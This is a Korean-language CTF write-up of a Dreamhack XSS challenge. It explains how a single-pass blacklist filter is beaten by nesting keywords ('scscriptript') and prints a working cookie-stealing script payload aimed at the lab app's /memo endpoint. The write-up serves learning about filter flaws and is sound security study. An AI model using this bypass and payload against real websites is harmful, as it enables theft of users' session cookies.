---
title: "XSS Filtering Bypass (Dreamhack, B2)"
date: 2026-06-23
draft: false
tags: ["XSS"]
ShowToc: true
---

## 문제 분석

- /vuln: param을 xss_filter 통과 후 그대로 응답에 출력 → 서버 직접 출력 sink → `<script>` 실행 가능
- /flag: POST param을 check_xss로 넘겨 FLAG 쿠키 든 봇 호출
- /memo: 전역 변수 memo_text에 누적 저장 후 출력

```python
def xss_filter(text):
    _filter = ["script", "on", "javascript:"]
    for f in _filter:
        if f in text.lower():
            text = text.replace(f, "")
    return text
```

## 취약점

- 서버가 param을 응답 본문에 직접 출력 → `<script>`가 파서에 그대로 걸려 실행
- 필터는 script, on, javascript: 를 대소문자 무관 제거 → 일반 `<script>`와 on 이벤트 핸들러 모두 차단

## 공격

### 흐름 설계

봇 호출 → /vuln 방문·실행 → 쿠키 읽기 → /memo로 전송 → 공격자가 /memo 확인

### 필터 우회

- 결함: 각 금지어를 단발 replace로 제거, 제거 후 결과 재검사 없음
- 우회: 금지어 안에 같은 금지어를 한 겹 중첩 → 바깥이 제거되면 양옆이 붙어 부활
  - script → scscriptript: 가운데 script 제거 시 sc + ript = script 복원
  - on → oonn: 가운데 on 제거 시 o + n = on 복원

> 당위: 단발 replace는 한 번의 좌→우 스캔에서 만난 것만 제거, 치환 결과는 재스캔 없음s

### 페이로드 조립

태그만 중첩 우회, 본문(new Image().src ... document.cookie)은 금지어 미포함이라 그대로 통과:

```html
<scscriptript>new Image().src="http://127.0.0.1:8000/memo?memo=" + document.cookie</scscriptript>
```

> 당위: 봇 방문 시 필터가 scscriptript를 script로 복원 → 서버가 응답에 출력 → 파서가 실행 → 쿠키 /memo로 유출

### 단계적 검증

1. scscriptript의 script 복원 확인: `/vuln?param=<scscriptript>alert(1)</scscriptript>` → alert 발생 시 우회 성공
2. /memo 전송 통로 확인: 본문은 XSS-1·2와 동일
3. memo 값을 document.cookie로 교체 후 /flag 제출: 봇 쿠키 탈취

## 풀이

/flag 폼에 페이로드 제출 → 봇 방문, 필터 복원 후 실행 → /memo에서 쿠키 확인

## 배운 점

- 블랙리스트 + 단발 replace의 전형적 결함: 제거 후 재검사 부재 → 금지어 중첩으로 부활
- 판별점: 필터가 결과 불변까지 반복(while)인가 단발인가 → 단발이면 중첩 우회 성립